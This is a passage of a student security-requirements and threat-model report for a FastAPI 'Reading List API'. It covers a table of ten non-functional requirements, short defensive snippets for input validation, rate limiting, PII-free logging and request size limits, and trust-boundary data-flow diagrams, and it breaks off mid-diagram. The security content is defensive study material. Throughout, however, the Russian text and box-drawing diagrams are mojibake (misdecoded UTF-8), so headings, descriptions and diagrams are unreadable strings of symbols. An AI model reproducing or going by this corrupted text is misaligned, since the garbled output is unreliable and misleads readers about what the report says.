# ğŸ“‹ ĞÑ‚Ñ‡Ñ‘Ñ‚ Ğ¢Ğœ 0.15 â€” Ğ¢Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ Ğ±ĞµĞ·Ğ¾Ğ¿Ğ°ÑĞ½Ğ¾ÑÑ‚Ğ¸ + ĞœĞ¾Ğ´ĞµĞ»ÑŒ ÑƒĞ³Ñ€Ğ¾Ğ·

**ĞŸÑ€Ğ¾ĞµĞºÑ‚:** Reading List API  
**ĞĞ²Ñ‚Ğ¾Ñ€:** ĞÑ‚Ğ°Ñ…Ğ°Ğ½Ğ¾Ğ² ĞĞ°Ğ±Ğ¸ÑĞ»Ğ»Ğ° Ğ ÑƒĞ¼Ğ¸ĞµĞ²Ğ¸Ñ‡ (Ğ‘ĞŸĞ˜234)  
**Ğ”Ğ°Ñ‚Ğ°:** 17 Ğ´ĞµĞºĞ°Ğ±Ñ€Ñ 2025  
**Ğ’ĞµÑ€ÑĞ¸Ñ:** 1.0

---

## ğŸ“‘ ĞĞ³Ğ»Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ğµ

1. [ĞšÑ€Ğ°Ñ‚ĞºĞ¾Ğµ Ğ¾Ğ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ Ğ¿Ñ€Ğ¾ĞµĞºÑ‚Ğ°](#1-ĞºÑ€Ğ°Ñ‚ĞºĞ¾Ğµ-Ğ¾Ğ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ-Ğ¿Ñ€Ğ¾ĞµĞºÑ‚Ğ°)
2. [NFR â€” ĞĞµÑ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¾Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğµ Ñ‚Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ](#2-nfr--Ğ½ĞµÑ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¾Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğµ-Ñ‚Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ)
3. [DFD â€” Ğ”Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ñ‹ Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…](#3-dfd--Ğ´Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ñ‹-Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ²-Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…)
4. [STRIDE â€” ĞĞ½Ğ°Ğ»Ğ¸Ğ· ÑƒĞ³Ñ€Ğ¾Ğ·](#4-stride--Ğ°Ğ½Ğ°Ğ»Ğ¸Ğ·-ÑƒĞ³Ñ€Ğ¾Ğ·)
5. [ĞœĞµÑ€Ñ‹ Ğ¿Ñ€Ğ¾Ñ‚Ğ¸Ğ²Ğ¾Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ Ñ Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¾Ğ¹](#5-Ğ¼ĞµÑ€Ñ‹-Ğ¿Ñ€Ğ¾Ñ‚Ğ¸Ğ²Ğ¾Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ-Ñ-Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¾Ğ¹)
6. [Ğ ĞµĞµÑÑ‚Ñ€ Ñ€Ğ¸ÑĞºĞ¾Ğ² Ğ¸ Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ](#6-Ñ€ĞµĞµÑÑ‚Ñ€-Ñ€Ğ¸ÑĞºĞ¾Ğ²-Ğ¸-Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ)
7. [Abuse Cases / Misuse Cases](#7-abuse-cases--misuse-cases)
8. [Ğ¡Ğ¾Ğ¾Ñ‚Ğ²ĞµÑ‚ÑÑ‚Ğ²Ğ¸Ğµ ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸ÑĞ¼ Ğ¾Ñ†ĞµĞ½ĞºĞ¸](#8-ÑĞ¾Ğ¾Ñ‚Ğ²ĞµÑ‚ÑÑ‚Ğ²Ğ¸Ğµ-ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸ÑĞ¼-Ğ¾Ñ†ĞµĞ½ĞºĞ¸)

---

## 1. ĞšÑ€Ğ°Ñ‚ĞºĞ¾Ğµ Ğ¾Ğ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ Ğ¿Ñ€Ğ¾ĞµĞºÑ‚Ğ°

**Reading List API** â€” REST API Ğ´Ğ»Ñ ÑƒĞ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ñ ÑĞ¿Ğ¸ÑĞºĞ¾Ğ¼ Ñ‡Ñ‚ĞµĞ½Ğ¸Ñ ĞºĞ½Ğ¸Ğ³, Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°Ğ½Ğ½Ğ¾Ğµ Ğ² Ñ€Ğ°Ğ¼ĞºĞ°Ñ… ĞºÑƒÑ€ÑĞ° SecDev.

### Ğ¢ĞµÑ…Ğ½Ğ¾Ğ»Ğ¾Ğ³Ğ¸Ñ‡ĞµÑĞºĞ¸Ğ¹ ÑÑ‚ĞµĞº

| ĞšĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚ | Ğ¢ĞµÑ…Ğ½Ğ¾Ğ»Ğ¾Ğ³Ğ¸Ñ |
|-----------|------------|
| Framework | FastAPI (Python 3.11) |
| Validation | Pydantic v2 |
| Rate Limiting | SlowAPI |
| Container | Docker (multi-stage, non-root) |
| CI/CD | GitHub Actions |
| Security Scanning | Bandit, pip-audit, Trivy, Checkov |

### Ğ¤ÑƒĞ½ĞºÑ†Ğ¸Ğ¾Ğ½Ğ°Ğ»ÑŒĞ½Ğ¾ÑÑ‚ÑŒ

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Reading List API                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  POST   /entries          â†’ Ğ¡Ğ¾Ğ·Ğ´Ğ°Ñ‚ÑŒ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ                  â”‚
â”‚  GET    /entries          â†’ ĞŸĞ¾Ğ»ÑƒÑ‡Ğ¸Ñ‚ÑŒ Ğ²ÑĞµ Ğ·Ğ°Ğ¿Ğ¸ÑĞ¸             â”‚
â”‚  GET    /entries/{id}     â†’ ĞŸĞ¾Ğ»ÑƒÑ‡Ğ¸Ñ‚ÑŒ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ Ğ¿Ğ¾ ID           â”‚
â”‚  PUT    /entries/{id}     â†’ ĞĞ±Ğ½Ğ¾Ğ²Ğ¸Ñ‚ÑŒ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ                 â”‚
â”‚  DELETE /entries/{id}     â†’ Ğ£Ğ´Ğ°Ğ»Ğ¸Ñ‚ÑŒ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ                  â”‚
â”‚  GET    /entries/filter/* â†’ Ğ¤Ğ¸Ğ»ÑŒÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ Ğ¿Ğ¾ ÑÑ‚Ğ°Ñ‚ÑƒÑÑƒ/Ğ°Ğ²Ñ‚Ğ¾Ñ€Ñƒ    â”‚
â”‚  GET    /health           â†’ Health check                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 2. NFR â€” ĞĞµÑ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¾Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğµ Ñ‚Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ

### 2.1 Ğ¢Ğ°Ğ±Ğ»Ğ¸Ñ†Ğ° NFR (10 Ñ‚Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğ¹)

| ID | ĞĞ°Ğ·Ğ²Ğ°Ğ½Ğ¸Ğµ | ĞĞ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ | ĞœĞµÑ‚Ñ€Ğ¸ĞºĞ°/ĞŸĞ¾Ñ€Ğ¾Ğ³ | ĞŸÑ€Ğ¾Ğ²ĞµÑ€ĞºĞ° | ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚ |
|----|----------|----------|---------------|----------|-----------|
| **NFR-001** | Ğ’Ñ€ĞµĞ¼Ñ Ğ¾Ñ‚ĞºĞ»Ğ¸ĞºĞ° API | Ğ’Ñ€ĞµĞ¼Ñ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ° CRUD-Ğ¾Ğ¿ĞµÑ€Ğ°Ñ†Ğ¸Ğ¹ | p95 â‰¤ 200 Ğ¼Ñ | pytest-benchmark | High |
| **NFR-002** | Ğ”Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ¾ÑÑ‚ÑŒ ÑĞµÑ€Ğ²Ğ¸ÑĞ° | Uptime Ğ² Ñ€Ğ°Ğ±Ğ¾Ñ‡Ğ¸Ğµ Ñ‡Ğ°ÑÑ‹ | SLA â‰¥ 99.5% | `/health` monitoring | Critical |
| **NFR-003** | Ğ’Ğ°Ğ»Ğ¸Ğ´Ğ°Ñ†Ğ¸Ñ Ğ²Ñ…Ğ¾Ğ´Ğ½Ñ‹Ñ… Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… | Ğ—Ğ°Ñ‰Ğ¸Ñ‚Ğ° Ğ¾Ñ‚ Ğ¸Ğ½ÑŠĞµĞºÑ†Ğ¸Ğ¹ | 100% Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ¾Ğ² Ñ‡ĞµÑ€ĞµĞ· Pydantic | Unit-Ñ‚ĞµÑÑ‚Ñ‹, Bandit | Critical |
| **NFR-004** | Rate Limiting | ĞĞ³Ñ€Ğ°Ğ½Ğ¸Ñ‡ĞµĞ½Ğ¸Ğµ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ¾Ğ² | â‰¤ 100 req/min Ğ½Ğ° IP | SlowAPI middleware | High |
| **NFR-005** | Ğ‘ĞµĞ·Ğ¾Ğ¿Ğ°ÑĞ½Ğ¾ÑÑ‚ÑŒ Ğ·Ğ°Ğ²Ğ¸ÑĞ¸Ğ¼Ğ¾ÑÑ‚ĞµĞ¹ | ĞÑ‚ÑÑƒÑ‚ÑÑ‚Ğ²Ğ¸Ğµ CVE | 0 Critical/High | pip-audit Ğ² CI | Critical |
| **NFR-006** | Ğ Ğ°Ğ·Ğ¼ĞµÑ€ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ° API | ĞŸĞ°Ğ³Ğ¸Ğ½Ğ°Ñ†Ğ¸Ñ | â‰¤ 100 Ğ·Ğ°Ğ¿Ğ¸ÑĞµĞ¹/ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ | Unit-Ñ‚ĞµÑÑ‚Ñ‹ | Medium |
| **NFR-007** | Ğ›Ğ¾Ğ³Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ¾Ğ¿ĞµÑ€Ğ°Ñ†Ğ¸Ğ¹ | ĞÑƒĞ´Ğ¸Ñ‚ CUD-Ğ¾Ğ¿ĞµÑ€Ğ°Ñ†Ğ¸Ğ¹ | 100% Ğ»Ğ¾Ğ³Ğ¸Ñ€ÑƒÑÑ‚ÑÑ | Structured logs | High |
| **NFR-008** | Ğ Ğ°Ğ·Ğ¼ĞµÑ€ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ° | Ğ—Ğ°Ñ‰Ğ¸Ñ‚Ğ° Ğ¾Ñ‚ DoS | Max body â‰¤ 64 KB | Middleware | Medium |
| **NFR-009** | Ğ¢Ğ°Ğ¹Ğ¼Ğ°ÑƒÑ‚Ñ‹ ÑĞ¾ĞµĞ´Ğ¸Ğ½ĞµĞ½Ğ¸Ğ¹ | ĞŸÑ€ĞµĞ´Ğ¾Ñ‚Ğ²Ñ€Ğ°Ñ‰ĞµĞ½Ğ¸Ğµ Ğ·Ğ°Ğ²Ğ¸ÑĞ°Ğ½Ğ¸Ñ | Timeout â‰¤ 30 ÑĞµĞº | Server config | Medium |
| **NFR-010** | ĞŸĞ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ Ñ‚ĞµÑÑ‚Ğ°Ğ¼Ğ¸ | ĞšĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ¾ ĞºĞ¾Ğ´Ğ° | Coverage â‰¥ 80% | pytest-cov Ğ² CI | High |

### 2.2 ĞšÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸Ğ¸ Ğ¿Ñ€Ğ¸Ñ‘Ğ¼ĞºĞ¸ NFR

| ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚ | NFR | ĞšÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸Ğ¹ |
|-----------|-----|----------|
| **P0 Critical** | NFR-002, NFR-003, NFR-005 | Ğ‘Ğ»Ğ¾ĞºĞ¸Ñ€ÑƒÑÑ‚ Ñ€ĞµĞ»Ğ¸Ğ· |
| **P1 High** | NFR-001, NFR-004, NFR-007, NFR-010 | Ğ’Ğ°Ğ¶Ğ½Ñ‹ Ğ´Ğ»Ñ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ° |
| **P2 Medium** | NFR-006, NFR-008, NFR-009 | Ğ–ĞµĞ»Ğ°Ñ‚ĞµĞ»ÑŒĞ½Ñ‹Ğµ |

### 2.3 Ğ”Ğ¾ĞºĞ°Ğ·Ğ°Ñ‚ĞµĞ»ÑŒÑÑ‚Ğ²Ğ° Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ğ¸ NFR

#### NFR-003: Ğ’Ğ°Ğ»Ğ¸Ğ´Ğ°Ñ†Ğ¸Ñ Ğ²Ñ…Ğ¾Ğ´Ğ½Ñ‹Ñ… Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…

```python
# app/models.py
class EntryCreate(BaseModel):
    title: str = Field(..., min_length=1, max_length=200)
    author: str = Field(..., min_length=1, max_length=100)
    status: ReadingStatus = Field(default=ReadingStatus.TO_READ)
    notes: Optional[str] = Field(None, max_length=1000)
```

#### NFR-004: Rate Limiting

```python
# app/main.py
limiter = Limiter(key_func=get_remote_address)

@app.post("/entries", response_model=Entry, status_code=201)
@limiter.limit("100/minute")
def create_entry(request: Request, entry_data: EntryCreate):
    ...
```

#### NFR-007: Secure Logging

```python
# app/main.py â€” Ğ»Ğ¾Ğ³Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ±ĞµĞ· PII
logger.info(f"CREATE_ENTRY | id={entry.id} | status={entry.status}")
logger.info(f"UPDATE_ENTRY | id={entry_id} | fields={list(update_dict.keys())}")
logger.info(f"DELETE_ENTRY | id={entry_id}")
```

#### NFR-008: Request Size Limit

```python
# app/main.py
MAX_BODY_SIZE = 64 * 1024  # 64 KB limit

class RequestSizeLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        content_length = request.headers.get("content-length")
        if content_length and int(content_length) > MAX_BODY_SIZE:
            return JSONResponse(status_code=413, ...)
```

---

## 3. DFD â€” Ğ”Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ñ‹ Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…

### 3.1 ĞšĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚Ğ½Ğ°Ñ Ğ´Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ° (Level 0)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      ğŸ”´ TRUST BOUNDARY: EXTERNAL (UNTRUSTED)                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚   ğŸ‘¤ User        â”‚              â”‚  ğŸ´â€â˜ ï¸ Attacker    â”‚                     â”‚
â”‚  â”‚   (Browser)      â”‚              â”‚  (Malicious)     â”‚                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚ F1: HTTPS Request               â”‚ F1': Malicious Request
            â–¼                                 â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      ğŸŸ¡ TRUST BOUNDARY: EDGE (DMZ)                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  âš–ï¸ Load Balancer / Reverse Proxy                                    â”‚   â”‚
â”‚  â”‚  - TLS Termination                                                   â”‚   â”‚
â”‚  â”‚  - WAF Rules                                                         â”‚   â”‚
â”‚  â”‚  - IP Filtering                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â”‚ F2: HTTP Forward
                                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      ğŸŸ¢ TRUST BOUNDARY: CORE (TRUSTED)                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  ğŸ–¥ï¸ Reading List API (FastAPI)                                       â”‚   â”‚
â”‚  â”‚  - Rate Limiter (SlowAPI)                                            â”‚   â”‚
â”‚  â”‚  - Input Validator (Pydantic)                                        â”‚   â”‚
â”‚  â”‚  - CRUD Handler                                                      â”‚   â”‚
â”‚  â”‚  - Audit Logger                                                      â”‚   â”‚
â”‚  â”‚  - Security Headers Middleware                                       â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â”‚ F3: Query/Write
                                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      ğŸ”µ TRUST BOUNDARY: DATA (INTERNAL)                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  ğŸ’¾ Database                                                          â”‚   â”‚
â”‚  â”‚  - In-Memory (dev) / PostgreSQL (prod)                               â”‚   â”‚
â”‚  â”‚  - Encryption at rest                                                â”‚   â”‚
â”‚  â”‚  - Network isolation                                                 â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.2 Ğ”ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ğ°Ñ Ğ´Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ° (Level 1) â€” API Processing

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    F1: POST /entries     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ğŸ‘¤      â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚   ğŸ”€        â”‚
â”‚  Client  â”‚                          â”‚   Nginx/LB  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                          â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
                                             â”‚ F2
                                             â–¼
                                      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                      â”‚   ğŸš¦        â”‚
                                      â”‚ Rate Limiterâ”‚ â—„â”€â”€â”€ NFR-004
                                      â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
                                             â”‚ F3
                                             â–¼
                                      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                      â”‚   âœ…        â”‚
                                      â”‚  Validator  â”‚ â—„â”€â”€â”€ NFR-003
                                      â”‚  (Pydantic) â”‚
                                      â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
                                             â”‚ F4: Validated Data
                                             â–¼
                                      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                      â”‚   ğŸ”€        â”‚
                                      â”‚   Router    â”‚
                                      â”‚  (FastAPI)  â”‚
                                      â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
                                             â”‚ F5
                                             â–¼
                           â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                           â”‚                                     â”‚
                           â–¼                                     â–¼
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚   ğŸ“        â”‚                       â”‚   ğŸ“‹        â”‚
                    â”‚ CRUD Handlerâ”‚                       â”‚ Audit Loggerâ”‚ â—„â”€â”€â”€ NFR-007
                    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜                       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                           â”‚ F6: INSERT/UPDATE/DELETE
                           â–¼
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚   ğŸ’¾        â”‚
                    â”‚  Database   â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.3 Ğ”Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ° Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… â€” Ğ¤Ğ¸Ğ»ÑŒÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    GET /entries/filter/by-status?status=reading
